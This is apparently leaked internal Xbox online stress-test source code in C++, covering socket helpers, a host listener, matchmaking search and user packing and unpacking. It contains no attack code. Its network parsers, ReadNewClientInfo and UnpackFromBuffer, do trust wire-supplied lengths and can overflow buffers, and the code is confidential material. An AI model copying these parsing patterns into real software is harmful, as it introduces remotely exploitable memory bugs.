HRESULT client_Main(CMatchSearchTask *pMatchSearchTask);
HRESULT host_Main(void);

VOID WINAPI onlinestress_StartTest( HANDLE LogHandle );
VOID WINAPI onlinestress_EndTest( VOID );
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\SessionUser.h ===
// SessionUser.h: interface for the CSessionUser class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>

#pragma pack(push, 1)

// This structure frames individual users that are sent on the wire
typedef struct
{
	DWORD dwUserSize;
	DWORD dwNameSize;
	DWORD dwKingdomSize;
} XONSTRESS_USER_HEADER, *PXONSTRESS_USER_HEADER;


#pragma pack(pop)

class CSessionUser  
{
public:
	CSessionUser& operator = (const CSessionUser&);
	bool operator ==(CSessionUser &);
	bool operator <(CSessionUser &);
	HRESULT UnpackFromBuffer(CHAR *pBuff, DWORD *pdwBuffSize);
	HRESULT PackIntoBuffer(CHAR *pBuff, DWORD *pdwBuffSize);
	void GetUserInfo(XUID *pUserID, CHAR *szUserName, CHAR *szUserKingdom);
	void SetUserInfo(XUID *pUserID, CHAR *szUserName, CHAR *szUserKingdom);
	CSessionUser(const CSessionUser &SessionUser);
	CSessionUser();
	virtual ~CSessionUser();

protected:
	CHAR m_szUserKingdom[XONLINE_KINGDOM_SIZE];
	XUID m_UserID;
	CHAR m_szUserName[XONLINE_NAME_SIZE];
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\onlinestress.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       onlinestress.cpp
 *  Content:    onlinestress tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  12/06/01    tristanj Created to test Xbox onlinestress
 *
 ****************************************************************************/

#include "onlinestress.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

HANDLE g_hLog = NULL;
CLogonTask *g_pLogonTask = NULL;
BOOL g_fExitTest = FALSE;

/****************************************************************************
 *
 *  TRACE
 *
 ****************************************************************************/
#if defined(NOLOGGING)
void WINAPI TRACE(HANDLE hLog, LPCSTR szFormat, ...) {
	WCHAR szBuffer[1024] = L"", szWideFormat[1024] = L"";
	va_list pArgs; 
	va_start(pArgs, szFormat);

	mbstowcs(szWideFormat, szFormat, strlen(szFormat));
	szWideFormat[strlen(szFormat)] = 0;
	
	wvsprintf(szBuffer, szWideFormat, pArgs);
	wcscat(szBuffer, L"\n");
	
	va_end(pArgs);

	OutputDebugString(szBuffer);
}
#endif

/****************************************************************************
 *
 *  SendPacket
 *
 *  Description:
 *      Sends data to the socket until the request completes, or the specified
 *      timer has expired
 *
 *  Arguments:
 *      SOCKET                 Socket              Socket from which to send the packet
 *      CHAR                   *pBuff              Buffer to send the packet from
 *      INT                    nSizeToSend         Ammount of data to send
 *      COnlineTimer           *pTimer             If this object expires, then the send will fail
 *                                                 If NULL, return immediately if send fails
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if the socket timed out
 *      E_FAIL on system failure
 *
 ****************************************************************************/
HRESULT SendPacket(SOCKET Socket, CHAR *pBuff, INT nSizeToSend, COnlineTimer *pTimer)
{
	HRESULT hr = S_OK;
	INT nSentSize = 0, nRet = 0;

	if(pTimer)
		pTimer->Start();

	do
	{
		nRet = send(Socket, pBuff + nSentSize, nSizeToSend - nSentSize, 0);
		// If a socket error other than WOULDBLOCK occurs, then bail
		if(nRet == SOCKET_ERROR)
		{
			// Keep trying until timeout for a WOULDBLOCK error
			if(WSAGetLastError() == WSAEWOULDBLOCK)
			{
				Sleep(0);
				hr = S_FALSE;
				continue;
			}

			LOGTASKINFO(g_hLog, "Unexpected socket error received from client");
			return E_FAIL;
		}
		
		nSentSize += nRet;

		// If we read the client size, then continue to the next stage
		if(nSentSize == nSizeToSend)
		{
			hr = S_OK;
			break;
		}
	}
	while(pTimer && (!pTimer->HasTimeExpired()));

	if(pTimer && (pTimer->HasTimeExpired()))
		hr = S_FALSE;

	return hr;
}

/****************************************************************************
 *
 *  ReadPacket
 *
 *  Description:
 *      Reads data from the socket until either the amount of data requested
 *      has been received, or the specified timer has expired
 *
 *  Arguments:
 *      SOCKET                 Socket              Socket from which to read the packet
 *      CHAR                   *pBuff              Buffer in which to put the packet
 *      INT                    nSizeToRead         Ammount of data to read
 *      COnlineTimer           *pTimer             If this object expires, then the read will fail
 *                                                 If NULL, return immediately if nothing to read
 *
 *  Returns:  
 *      S_OK all data was 
 *      S_FALSE if the socket timed out
 *      E_FAIL if the there was a system error
 *
 ****************************************************************************/
HRESULT ReadPacket(SOCKET Socket, CHAR *pBuff, INT nSizeToRead, COnlineTimer *pTimer)
{
	HRESULT hr = S_OK;
	INT nReceivedSize = 0, nRet = 0;

	if(pTimer)
		pTimer->Start();

	do
	{
		nRet = recv(Socket, pBuff + nReceivedSize, nSizeToRead - nReceivedSize, 0);
		// If a socket error other than WOULDBLOCK occurs, then bail
		if(nRet == SOCKET_ERROR)
		{
			// Keep trying until timeout for a WOULDBLOCK error
			if(WSAGetLastError() == WSAEWOULDBLOCK)
			{
				Sleep(0);
				hr = S_FALSE;
				continue;
			}

			LOGTASKINFO(g_hLog, "Unexpected socket error received from client");
			return E_FAIL;
		}
		// If the socket was closed on the other end, then bail
		else if(nRet == 0)
		{
			LOGTASKINFO(g_hLog, "Client socket closed unexpectedly");
			return E_FAIL;
		}
		
		nReceivedSize += nRet;

		// If we read the client size, then continue to the next stage
		if(nReceivedSize == nSizeToRead)
		{
			hr = S_OK;
			break;
		}
	}
	while(pTimer && (!pTimer->HasTimeExpired()));

	if(pTimer && (pTimer->HasTimeExpired()))
		hr = S_FALSE;

	return hr;
}

/****************************************************************************
 *
 *  ReadNewClientInfo
 *
 *  Description:
 *      Reads the client/user information from the client that just connected
 *      and parses the data into the newly created CClientConnection object
 *
 *  Arguments:
 *      Socket                 Socket              Socket connecting to host
 *      CClientConnection      *pNewClient         Client object that will hold the received client info
 *
 *  Returns:  
 *      S_OK if the client info was successfully parsed
 *      S_FALSE if the socket timed out
 *      E_FAIL if the data received was invalid or there was a system error
 *
 ****************************************************************************/
HRESULT ReadNewClientInfo(SOCKET Socket, CClientConnection *pNewClient)
{
	COnlineTimer Timer;
	HRESULT hr = S_OK;
	DWORD dwClientSize = 0;
	CHAR *pBuff = (CHAR *) &dwClientSize;

	// Allow 5 seconds for client to send its information
	Timer.SetAllowedTime(MAX_NEW_CLIENT_INFO_TIME);

	// Read the first DWORD of the incoming packet which contains the client info size
	hr = ReadPacket(Socket, pBuff, sizeof(DWORD), &Timer);

	if(hr != S_OK)
		return hr;

	if((dwClientSize > XONSTRESS_MAX_CLIENT_SIZE) || (dwClientSize < XONSTRESS_MIN_CLIENT_SIZE))
	{
		LOGTASKINFO(g_hLog, "Client indicated size greater than maximum or less than minimum");
		return E_FAIL;
	}

	// Allocate a buffer for the rest of the packet
	pBuff = new CHAR[dwClientSize];
	if(!pBuff)
	{
		LOGTASKINFO(g_hLog, "Not enough memory to allocate client buffer");
		return E_FAIL;
	}

	*((DWORD *) pBuff) = dwClientSize;

	// Read the rest of the packet
	hr = ReadPacket(Socket, pBuff + sizeof(DWORD), dwClientSize, &Timer);

	if(hr != S_OK)
		return hr;

	// Parse the packet information into the client object
	hr = pNewClient->UnpackFromBuffer(pBuff, &dwClientSize);

	return hr;
}

/****************************************************************************
 *
 *  CreateListenSocket
 *
 *  Description:
 *      Create a host socket and begin listening for incoming connections
 *
 *  Arguments:
 *      CListenSocket         *pListenSocket      The socket that will be created to handle incoming
 *                                                connection requests
 *      XNKID                 pSessionID          XNKID to register with the network stack
 *      XNKEY                 pKeyExchangeKey     XNKEY to register with the network stack
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT CreateListenSocket(CListenSocket **ppListenSocket, XNKID *pSessionID, XNKEY *pKeyExchangeKey)
{
	HRESULT hr = S_OK;

	if(!ppListenSocket || !pSessionID || !pKeyExchangeKey)
		return E_FAIL;

	*ppListenSocket = new CListenSocket();

	hr = (*ppListenSocket)->StartListening(XONSTRESS_HOST_PORT);
	if(hr != S_OK)
		goto Exit;

Exit:

	if(hr != S_OK)
	{
		delete *ppListenSocket;
		*ppListenSocket = NULL;
	}

	return hr;
}

/****************************************************************************
 *
 *  SearchForStressSession
 *
 *  Description:
 *      Searches for active stress sessions with available slots
 *
 *  Arguments:
 *      CMatchSearchTask      *pMatchSearchTask   Pointer to a match search task used to issue the search
 *
 *  Returns:  
 *      S_OK if a stress session with extra space was found
 *      S_FALSE if a stress session wasn't found
 *      E_FAIL if there was some kind of system failure
 *
 ****************************************************************************/
HRESULT SearchForStressSession(CMatchSearchTask *pMatchSearchTask)
{
	COnlineTimer SearchTimer;
	HRESULT hr = S_OK;
	DWORD dwResultsCount = 0;

	pMatchSearchTask->SetSearchAttributes(NULL, 0);
	pMatchSearchTask->SetResultsSize(XONLINESTRESS_MAX_RESULTS, XONLINESTRESS_MAX_RESULTS_LEN);
	pMatchSearchTask->SetSearchProcIndex(XONLINESTRESS_SEARCH_PROC);

	// Start the search for an available stress session
	if(!pMatchSearchTask->StartTask())
	{
		LOGTASKINFOHR(g_hLog, "Error starting matchmaking search", hr);
		hr = E_FAIL;
		goto Exit;
	}

	SearchTimer.SetAllowedTime(XONLINESTRESS_MAX_MATCH_SEARCH_TIME);
	SearchTimer.Start();

	// Pump the search task until completion
	do
	{
		if(!pMatchSearchTask->WaitForWork(SearchTimer.GetTimeRemaining()))
			continue;

		hr = pMatchSearchTask->TaskContinue();
		if(XONLINETASK_STATUS_AVAILABLE(hr))
			break;

	} while(!SearchTimer.HasTimeExpired());

	if(SearchTimer.HasTimeExpired())
	{
		LOGTASKINFO(g_hLog, "Timed out searching for host session");
		hr = S_FALSE;
		goto Exit;
	}

	hr = pMatchSearchTask->GetSearchResults(NULL, &dwResultsCount);
	if(hr != S_OK)
	{
		TRACE(g_hLog, "Error getting search results: 0x%08x", hr);
		goto Exit;
	}

	if(dwResultsCount == 0)
		hr = S_FALSE;
	else
		hr = S_OK;

Exit:

	return hr;
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      The stress test can be compiled in three ways:
 *         1) As a standalone Xbox XBE not running under the harness (i.e. _XBOX and NOLOGGING are defined)
 *         2) As an Xbox harness lib (i.e. _XBOX is defined and NOLOGGING is NOT defined)
 *         3) As a standalone PC app using CXOnline (i.e. _XBOX and NOLOGGING are NOT defined)
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#if defined(_XBOX) && defined(NOLOGGING)
int __cdecl main(int argc, char * argv[])
#else
#if !defined(_XBOX)
#define NOLOGGING
class CStressXOnline : public CXOnline
{
public:
    CStressXOnline(char * pszXbox = NULL) : CXOnline(pszXbox) {}
    int Main(int argc, char * argv[]);
	// BUGBUG - need to add entries for every function 
};

int __cdecl main(int argc, char * argv[])
{
    int result;
    char buffer[128];

    sprintf(buffer, "%s@Nic/0", getenv("COMPUTERNAME") );
    CStressXOnline * pTestXOnline = new CStressXOnline(buffer);
    result = pTestXOnline->Main(argc, argv);
    delete pTestXOnline;
    return(result);
}

int CStressXOnline::Main(int argc, char * argv[])
#endif
#endif

#ifdef NOLOGGING
{
    onlinestress_StartTest( NULL );
    onlinestress_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 *  onlinestress_BasicTest
 *
 *  Description:
 *      Basic Test for onlinestress
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT onlinestress_BasicTest( void )
{
	CMatchSearchTask        *pMatchSearchTask = NULL;
	CLogonTask              *pLogonTask = NULL;
	COnlineTimer			Timer;
    HRESULT                 hr              = S_OK;
	DWORD					ServicesArray[] =
	{
		XONLINE_USER_ACCOUNT_SERVICE,
		XONLINE_MATCHMAKING_SERVICE
	};
	DWORD                   dwServicesCount = sizeof(ServicesArray) / sizeof(DWORD), dwRandTime = 0, dwOnlineStatus = 0;
	XNADDR                  HostAddress;
	XNKID                   SessionID;
	XNKEY                   KeyExchangeKey;

	XNetAddRef();
		
	hr = XOnlineStartup(NULL);

	pLogonTask = new CLogonTask;
	pMatchSearchTask = new CMatchSearchTask;
	if(!pLogonTask || !pMatchSearchTask)
	{
		hr = E_FAIL;
		goto Exit;
	}

	memset(&HostAddress, 0, sizeof(HostAddress));
	memset(&SessionID, 0, sizeof(SessionID));
	memset(&KeyExchangeKey, 0, sizeof(KeyExchangeKey));
	
	// Set the global logon task
	g_pLogonTask = pLogonTask;
	
	// Populate users accounts from user account creation service
	hr = COnlineAccounts::Instance()->PopulateUserAccountsHD(NULL, 4);
	if(hr != S_OK)
	{
		xLog(g_hLog, XLL_FAIL, "Populating user accounts failed.");
		goto Exit;
	}
	
	pLogonTask->RegisterLogHandle(g_hLog);
	
	// The logon task will automatically login with as many users as possible
	
	// Add any requested services
	if(!pLogonTask->SetServices(ServicesArray, dwServicesCount))
	{
		hr = E_FAIL;
		goto Exit;
	}
	
	// Start logon async task
	if(!pLogonTask->StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}
	
	Timer.SetAllowedTime(MAX_LOGON_TIME);
	Timer.Start();
	
	// Pump task until complete
	while(!pLogonTask->IsConnectionEstablished())
	{
		if(Timer.HasTimeExpired())
			break;
		
		// Make sure to wait for the work event to test that it is always signalled when necessary
		if(!pLogonTask->WaitForWork(Timer.GetTimeRemaining()))
		{
			LOGTASKINFO(g_hLog, "Logon task wasn't signalled");
			break;
		}
		
		pLogonTask->TaskContinue();
	}
	
	if(!pLogonTask->IsConnectionEstablished())
	{
		LOGTASKINFO(g_hLog, "Logon timed-out");
		hr = E_FAIL;
		goto Exit;
	}
	
	// See if we can find a stress session to join
	hr = SearchForStressSession(pMatchSearchTask);

	// If a stress session was found with space left, then connect as a client
	if(hr == S_OK)
	{
		hr = client_Main(pMatchSearchTask);
	}
	// If a stress session wasn't found, then create one
	else if(hr == S_FALSE)
	{
		dwOnlineStatus = XNetGetTitleXnAddr(&HostAddress);
		if(!(dwOnlineStatus | XNET_GET_XNADDR_ONLINE))
		{
			LOGTASKINFO(g_hLog, "Error retrieving title XNADDR");
			hr = E_FAIL;
			goto Exit;
		}

		TRACE(g_hLog, "Hosting stress session on %02x-%02x-%02x-%02x-%02x-%02x",
			HostAddress.abEnet[0],
			HostAddress.abEnet[1],
			HostAddress.abEnet[2],
			HostAddress.abEnet[3],
			HostAddress.abEnet[4],
			HostAddress.abEnet[5]);

		hr = host_Main();
	}
	// If some other error occurred, then exit
	else
	{
		LOGTASKINFOHR(g_hLog, "Error searching for stress session", hr);
		hr = E_FAIL;
		goto Exit;
	}


Exit:

	if(pLogonTask)
		delete pLogonTask;

	if(pMatchSearchTask)
		delete pMatchSearchTask;

	if(FAILED(hr))
		TRACE(NULL, "ONLINESTRESS FAILED: 0x%08x", hr);
	else
		TRACE(NULL, "ONLINESTRESS SUCCEEDED");

	hr = XOnlineCleanup();
	
	XNetRelease();

    return hr;
}

/****************************************************************************
 *
 *  onlinestress_StartTest
 *
 *  Description:
 *      The Harness Entry into the onlinestress tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI onlinestress_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;
    XDEVICE_PREALLOC_TYPE deviceTypes[] = {
               {XDEVICE_TYPE_GAMEPAD, 4},
               {XDEVICE_TYPE_MEMORY_UNIT, 8}
    };

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

	g_hLog = LogHandle;

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

#ifdef NOLOGGING
	XInitDevices(sizeof(deviceTypes) / sizeof(XDEVICE_PREALLOC_TYPE), deviceTypes);
#endif
		
	
#ifdef NOLOGGING
	while(TRUE)
	{
#endif

	//
	// Test onlinestress in the mannor it was meant to be called
	//
	
	if ( SHOULDRUNTEST( "onlinestress", "Basic" ) )
	{
		SETLOG( LogHandle, "tristanj", "Online", "onlinestress", "Basic" );
		EXECUTE( onlinestress_BasicTest() );
	}
	
#ifdef NOLOGGING
	}
#endif

	g_hLog = NULL;
		
}

/****************************************************************************
 *
 *  onlinestress_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI onlinestress_EndTest( VOID )
{
	g_fExitTest = TRUE;
}

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( onlinestress )
#pragma data_seg()

BEGIN_EXPORT_TABLE( onlinestress )
    EXPORT_TABLE_ENTRY( "StartTest", onlinestress_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", onlinestress_EndTest )
END_EXPORT_TABLE( onlinestress )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\HostSocket.cpp ===
// HostSocket.cpp: implementation of the CHostSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "HostSocket.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CHostSocket::CHostSocket()
{
	m_fListening = FALSE;
	m_pSessionID = NULL;
	m_pKeyExchangeKey = NULL;
	m_ListenSocket = INVALID_SOCKET;
}

CHostSocket::~CHostSocket()
{
	UnregisterKey();
	
	if(m_fListening)
		closesocket(m_ListenSocket);
}

/****************************************************************************
 *
 *  RegisterKey
 *
 *  Description:
 *      Registers security information with the network stack so that the host
 *      can accept incoming connections from clients that saw the session on
 *      the match server
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      S_OK if the key was registered successfully
 *      E_FAIL if an error occured registering the key
 *
 ****************************************************************************/
HRESULT CHostSocket::RegisterKey(XNKID *pSessionID, XNKEY *pKeyExchangeKey)
{
	INT nRegisterRet = 0;

	if(m_pSessionID || m_pKeyExchangeKey)
		return E_FAIL;

	m_pSessionID = pSessionID;
	m_pKeyExchangeKey = pKeyExchangeKey;

	
	nRegisterRet = XNetRegisterKey(pSessionID, pKeyExchangeKey);

	if((nRegisterRet != 0) && (nRegisterRet != WSAEALREADY))
		return E_FAIL;

	return S_OK;
}

/****************************************************************************
 *
 *  IsConnectionPending
 *
 *  Description:
 *      Return whether or not there are any pending connections available on
 *      the host socket
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      S_OK if there are incoming connections pending
 *      S_FALSE if there are no incoming connections pending
 *      E_FAIL if the API was called incorrectly or a winsock or system error occured
 *
 ****************************************************************************/
HRESULT CHostSocket::IsConnectionPending()
{
	HRESULT hr = S_FALSE;
	INT nActiveSockets = 0;

    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(m_ListenSocket, &readfds);

    fd_set exceptfds;
    FD_ZERO(&exceptfds);
    FD_SET(m_ListenSocket, &exceptfds);
    
    TIMEVAL sTimeout = {0, 0}; 

	if(!m_fListening)
		return E_FAIL;

    nActiveSockets = select(0, &readfds, NULL, &exceptfds, &sTimeout);

    if(nActiveSockets <= 0)
    {
        hr = S_FALSE;
        goto Exit;
    }
                
    if(FD_ISSET(m_ListenSocket, &exceptfds))
    {
        hr = E_FAIL;
        goto Exit;
    }

    if(!FD_ISSET(m_ListenSocket, &readfds))
    {
        hr = E_FAIL;
        goto Exit;
    }

	hr = S_OK;

Exit:

	return hr;
}

/****************************************************************************
 *
 *  StartListening
 *
 *  Description:
 *      Create a host socket, set it to non-blocking, bind it to a designated port
 *      and begin listening for incoming connections
 *
 *  Arguments:
 *      WORD                wPort               Port to listen for incoming connection
 *                                              requests on
 *
 *  Returns:  
 *      S_OK if the socket was created and is listening
 *      E_FAIL if the API was called incorrectly or a winsock or system error occured
 *
 ****************************************************************************/
HRESULT CHostSocket::StartListening(WORD wPort)
{
	SOCKADDR_IN ListenAddress;
    ULONG uNonBlockParam = TRUE;

	if(m_fListening)
		return TRUE;

	m_ListenSocket = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

	if(m_ListenSocket == INVALID_SOCKET)
		goto Exit;

	if(SOCKET_ERROR == ioctlsocket(m_ListenSocket, FIONBIO, &uNonBlockParam))
		goto Exit;

	ListenAddress.sin_family = AF_INET;
    ListenAddress.sin_port = htons(wPort);
    ListenAddress.sin_addr.s_addr = INADDR_ANY;

	if(SOCKET_ERROR == bind(m_ListenSocket, (struct sockaddr *) &ListenAddress, sizeof(ListenAddress)))
		goto Exit;

	if(SOCKET_ERROR == listen(m_ListenSocket, MAX_CONNECTION_BACKLOG))
		goto Exit;

	m_fListening = TRUE;

Exit:

	if(!m_fListening)
	{
		if(m_ListenSocket != INVALID_SOCKET)
		{
			closesocket(m_ListenSocket);
			m_ListenSocket = INVALID_SOCKET;
		}
	}

	return m_fListening ? S_OK : E_FAIL;
}

/****************************************************************************
 *
 *  AcceptIncomingClient
 *
 *  Description:
 *      Pulls one client off the host socket backlog
 *
 *  Arguments:
 *      SOCKET              *pSocket            Returns the incoming client socket
 *      IN_ADDR             *pInAddr            Returns the locally bound IP of the incoming socket
 *      XNADDR              *pXnAddr            Returns the actual Xbox Online address of the incoming socket
 *
 *  Returns:  
 *      S_OK if the socket successfully accepted
 *      S_FALSE if the API timed out waiting for an incoming connection
 *      E_FAIL if the API was called incorrectly or a winsock or system error occured
 *
 ****************************************************************************/
HRESULT CHostSocket::AcceptIncomingClient(SOCKET *pSocket, IN_ADDR *pInAddr, XNADDR *pXnAddr, XNKID *pXnKid)
{
	SOCKADDR_IN IncomingSockAddr;
	INT nSockAddrSize = sizeof(SOCKADDR_IN);

	if(!pSocket || !m_fListening)
		return E_FAIL;

	if((*pSocket = accept(m_ListenSocket, (struct sockaddr *) &IncomingSockAddr, &nSockAddrSize)) == INVALID_SOCKET)
	{
		if(WSAGetLastError() == WSAEWOULDBLOCK)
			return S_FALSE;

		return E_FAIL;
	}

	if(pInAddr)
		(*pInAddr).S_un.S_addr = IncomingSockAddr.sin_addr.S_un.S_addr;

	if(pXnAddr && pXnKid)
	{
		if(XNetInAddrToXnAddr(IncomingSockAddr.sin_addr, pXnAddr, pXnKid))
		{
			closesocket(*pSocket);
			return E_FAIL;
		}
	}

	return S_OK;
}

/****************************************************************************
 *
 *  UnregisterKey
 *
 *  Description:
 *      Unregisters the security information used for the host socket
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      (none)
 *
 ****************************************************************************/
void CHostSocket::UnregisterKey()
{
	if(!m_pSessionID)
		return;

	XNetUnregisterKey(m_pSessionID);

	m_pSessionID = NULL;
	m_pKeyExchangeKey = NULL;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\SessionUser.cpp ===
// SessionUser.cpp: implementation of the CSessionUser class.
//
//////////////////////////////////////////////////////////////////////

#include "SessionUser.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSessionUser::CSessionUser()
{
	memset(&m_UserID, 0, sizeof(m_UserID));
	memset(m_szUserName, 0, sizeof(m_szUserName));
	memset(m_szUserKingdom, 0, sizeof(m_szUserKingdom));
}

CSessionUser::~CSessionUser()
{

}

CSessionUser::CSessionUser(const CSessionUser &SessionUser)
{
	memcpy(&m_UserID, &(SessionUser.m_UserID), sizeof(m_UserID));
	memcpy(m_szUserName, SessionUser.m_szUserName, sizeof(m_szUserName));
	memcpy(m_szUserKingdom, SessionUser.m_szUserKingdom, sizeof(m_szUserKingdom));
}

CSessionUser& CSessionUser::operator =(const CSessionUser& SessionUser)
{
	memcpy(&m_UserID, &(SessionUser.m_UserID), sizeof(m_UserID));
	memcpy(m_szUserName, SessionUser.m_szUserName, sizeof(m_szUserName));
	memcpy(m_szUserKingdom, SessionUser.m_szUserKingdom, sizeof(m_szUserKingdom));

	return *this;
}

bool CSessionUser::operator ==(CSessionUser &SessionUser)
{
	if(memcmp(&m_UserID, &(SessionUser.m_UserID), sizeof(m_UserID)))
		return false;

	if(strcmp(m_szUserName, SessionUser.m_szUserName))
		return false;

	if(strcmp(m_szUserKingdom, SessionUser.m_szUserKingdom))
		return false;

	return true;
}

bool CSessionUser::operator <(CSessionUser &SessionUser)
{
	return (m_UserID.qwUserID < SessionUser.m_UserID.qwUserID);
}

/****************************************************************************
 *
 *  SetUserInfo
 *
 *  Description:
 *      Sets all of the user information
 *
 *  Arguments:
 *      XUID                *pUserID            XUID to set for the user
 *      CHAR                *szUserName         Name to set for the user
 *      CHAR                *szUserKingdom      Kingdom to set for the user
 *
 *  Returns:  
 *      (none)
 *
 ****************************************************************************/
void CSessionUser::SetUserInfo(XUID *pUserID, CHAR *szUserName, CHAR *szUserKingdom)
{
	if(pUserID)
		memcpy(&m_UserID, pUserID, sizeof(m_UserID));

	if(szUserName && (strlen(szUserName) < XONLINE_NAME_SIZE))
		strcpy(m_szUserName, szUserName);

	if(szUserKingdom && (strlen(szUserKingdom) < XONLINE_KINGDOM_SIZE))
		strcpy(m_szUserKingdom, szUserKingdom);
}

/****************************************************************************
 *
 *  GetUserInfo
 *
 *  Description:
 *      Retrieves all of the user information
 *
 *  Arguments:
 *      XUID                *pUserID            XUID to get for the user
 *      CHAR                *szUserName         Name to get for the user
 *      CHAR                *szUserKingdom      Kingdom to get for the user
 *
 *  Returns:  
 *      (none)
 *
 ****************************************************************************/
void CSessionUser::GetUserInfo(XUID *pUserID, CHAR *szUserName, CHAR *szUserKingdom)
{
	if(pUserID)
		memcpy(pUserID, &m_UserID, sizeof(m_UserID));

	if(szUserName)
		strcpy(szUserName, m_szUserName);

	if(szUserKingdom)
		strcpy(szUserKingdom, m_szUserKingdom);
}

/****************************************************************************
 *
 *  PackIntoBuffer
 *
 *  Description:
 *      Packs all of the CSessionUser information into a buffer for transmission
 *      over the wire to another client
 *
 *  Arguments:
 *      CHAR                *pBuff              Buffer to hold the user information.  If this
 *                                              parameter is NULL and a non-NULL pdwBuffSize is
 *                                              provided, then the function will fill pdwBuffSize
 *                                              with the required size necessary
 *      DWORD               *pdwBuffSize        Holds the size of the provided buffer. On output
 *                                              this parameter will contain either the required size
 *                                              (if the provided size was insufficient) or the
 *                                              ammount of space that was actually used
 *
 *  Returns:  
 *      S_OK if the user was succesfully packed into the buffer
 *      S_FALSE if a buffer was supplied but it was too small to hold the data
 *      E_FAIL if bad parameters were passed in or a system error occured
 *
 ****************************************************************************/
HRESULT CSessionUser::PackIntoBuffer(CHAR *pBuff, DWORD *pdwBuffSize)
{
	PXONSTRESS_USER_HEADER pUserHeader = (PXONSTRESS_USER_HEADER) pBuff;
	DWORD dwRequiredSize = 0;

	if(!pdwBuffSize)
		return E_FAIL;

	dwRequiredSize = sizeof(XONSTRESS_USER_HEADER) + sizeof(m_UserID) + strlen(m_szUserName) + strlen(m_szUserKingdom);

	if(*pdwBuffSize < dwRequiredSize)
	{
		*pdwBuffSize = dwRequiredSize;
		return S_FALSE;
	}

	*pdwBuffSize = dwRequiredSize;

	pUserHeader->dwUserSize = dwRequiredSize;
	pUserHeader->dwNameSize = strlen(m_szUserName);
	pUserHeader->dwKingdomSize = strlen(m_szUserKingdom);
	
	memcpy(pBuff += sizeof(XONSTRESS_USER_HEADER), &m_UserID, sizeof(m_UserID));
	memcpy(pBuff += sizeof(m_UserID), m_szUserName, pUserHeader->dwNameSize);
	memcpy(pBuff += pUserHeader->dwNameSize, m_szUserKingdom, pUserHeader->dwKingdomSize);

	return S_OK;
}

/****************************************************************************
 *
 *  UnpackFromBuffer
 *
 *  Description:
 *      Unpacks a user information packet received over the wire into a new
 *      CSessionUser object
 *
 *  Arguments:
 *      CHAR                *pBuff              Buffer containing the received user information packet
 *      DWORD               *pdwBuffSize        On input, indicates the size of the received packet
 *                                              On output, indicates the size used to build the user object
 *
 *  Returns:  
 *      S_OK if the user object was succesfully unpacked from the buffer
 *      E_FAIL if bad parameters were passed in or a system error occured
 *
 ****************************************************************************/
HRESULT CSessionUser::UnpackFromBuffer(CHAR *pBuff, DWORD *pdwBuffSize)
{
	PXONSTRESS_USER_HEADER pUserHeader = (PXONSTRESS_USER_HEADER) pBuff;

	if(*pdwBuffSize < (sizeof(XONSTRESS_USER_HEADER) + sizeof(m_UserID)) || !pBuff)
		return E_FAIL;

	if(pUserHeader->dwUserSize > *pdwBuffSize)
		return E_FAIL;

	if((pUserHeader->dwNameSize + pUserHeader->dwKingdomSize + sizeof(XONSTRESS_USER_HEADER) + sizeof(m_UserID)) != pUserHeader->dwUserSize)
		return E_FAIL;

	*pdwBuffSize = pUserHeader->dwUserSize;

	memcpy(&m_UserID, pBuff += sizeof(XONSTRESS_USER_HEADER), sizeof(m_UserID));
	memset(m_szUserName, 0, sizeof(m_szUserName));
	memcpy(m_szUserName, pBuff += sizeof(m_UserID), pUserHeader->dwNameSize);
	memset(m_szUserKingdom, 0, sizeof(m_szUserKingdom));
	memcpy(m_szUserKingdom, pBuff += pUserHeader->dwNameSize, pUserHeader->dwKingdomSize);

	return S_OK;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\oharness\modules.cpp ===
